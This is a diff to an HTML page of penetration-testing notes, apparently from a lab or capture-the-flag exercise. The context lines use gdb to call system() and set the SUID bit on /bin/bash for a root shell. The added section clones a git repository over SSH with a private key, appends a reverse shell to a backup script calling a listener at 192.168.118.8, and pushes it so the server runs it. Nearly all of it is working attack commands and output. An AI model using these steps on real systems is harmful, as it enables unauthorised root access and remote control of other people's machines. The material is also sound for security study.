@@ -675,5 +675,22 @@ developer@faculty:~$ gdb -p 731
 Attaching to process 731
 (gdb) call (void)system(&quot;chmod u+s /bin/bash&quot;)
 quit
-bash -p</code></pre><p id="e4fe4480-b36f-42da-99df-faf8cf0d1026" class="">
+bash -p</code></pre><p id="e4fe4480-b36f-42da-99df-faf8cf0d1026" class="">Git:</p><pre id="dd784bca-a8cc-408e-87f7-34bfb57f0def" class="code"><code>GIT_SSH_COMMAND=&#x27;ssh -i id_rsa -p 43022&#x27; git clone gituser@0.0.0.0:/git-server
+cd git-server
+kali@kali:~/git-server$ git config --global user.name &quot;kali&quot;
+kali@kali:~/git-server$ git config --global user.email &quot;kali@kali.(none)&quot;
+#
+kali@kali:~/git-server$ echo &quot;sh -i &gt;&amp; /dev/tcp/192.168.118.8/8080 0&gt;&amp;1&quot; &gt;&gt; backups.sh 
+kali@kali:~/git-server$ chmod +x backups.sh
+#
+kali@kali:~/git-server$ GIT_SSH_COMMAND=&#x27;ssh -i ~/id_rsa -p 43022&#x27; git push origin master
+Enumerating objects: 5, done.
+Counting objects: 100% (5/5), done.
+Delta compression using up to 4 threads
+Compressing objects: 100% (3/3), done.
+Writing objects: 100% (3/3), 302 bytes | 302.00 KiB/s, done.
+Total 3 (delta 1), reused 0 (delta 0), pack-reused 0
+To 192.168.120.204:/git-server
+   b50f4e5..0212790  master -&gt; master
+kali@kali:~/git-server$</code></pre><p id="608c6d98-c498-49ab-9615-873e4fe68470" class="">
 </p></div></article></body></html>
